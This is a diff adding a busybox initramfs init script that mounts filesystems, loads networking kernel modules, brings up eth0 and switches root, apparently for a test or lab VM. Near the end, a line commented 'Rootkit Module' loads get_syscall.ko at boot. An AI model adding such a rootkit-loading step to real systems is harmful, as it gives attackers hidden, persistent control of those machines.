@@ -1,0 +1,52 @@
+#!/busybox sh
+
+/busybox mkdir -p bin proc sys dev mnt rootfs
+#/busybox --install -s /bin
+
+PATH=/
+
+mount -t proc none /proc
+mount -t sysfs none /sys
+mount -t tmpfs none /dev
+/busybox mdev -s
+
+mount /dev/sdb /rootfs
+mount /dev/sda1 /rootfs/root
+
+insmod rootfs/lib/modules/5.6.3-64/kernel/net/ipv6/netfilter/nf_defrag_ipv6.ko
+insmod rootfs/lib/modules/5.6.3-64/kernel/net/ipv6/ipv6.ko
+insmod rootfs/lib/modules/5.6.3-64/kernel/net/unix/unix.ko
+insmod rootfs/lib/modules/5.6.3-64/drivers/net/phy_helper.ko
+insmod rootfs/lib/modules/5.6.3-64/kernel/net/ipv6/tunnel6.ko
+insmod rootfs/lib/modules/5.6.3-64/kernel/net/netfilter/nf_conntrack.ko
+
+insmod rootfs/lib/modules/5.6.3-64/kernel/drivers/net/vrf.ko
+insmod rootfs/lib/modules/5.6.3-64/kernel/drivers/net/ethernet/intel/e1000/e1000.ko
+insmod rootfs/lib/modules/5.6.3-64/drivers/net/packet_hook.ko
+insmod rootfs/lib/modules/5.6.3-64/drivers/net/switch.ko
+insmod rootfs/lib/modules/5.6.3-64/net/bridge/bridge2.ko
+
+insmod rootfs/lib/modules/5.6.3-64/kernel/net/core/failover.ko
+insmod rootfs/lib/modules/5.6.3-64/kernel/drivers/net/net_failover.ko
+insmod rootfs/lib/modules/5.6.3-64/drivers/net/virtio_net.ko
+
+if [ -e /sys/class/net/eth0 ]; then
+    /busybox ifconfig eth0 up
+    /busybox udhcpc -i eth0
+fi
+
+mount -o move /proc /rootfs/proc
+mount -o move /sys /rootfs/sys
+mount -o move /dev /rootfs/dev
+
+/busybox clear
+# Rootkit Module
+[ -e /rootfs/root/get_syscall.ko ] && insmod /rootfs/root/get_syscall.ko
+
+#echo "Press any key to get shell"
+#sh -c 'sleep 5 && echo Shutdowning.. && poweroff -f' &
+#read -n 1
+#kill $!
+#exec /bin/getty -n -l /bin/sh ttyS0 115200 vt100
+
+exec /busybox switch_root  /rootfs /sbin/init
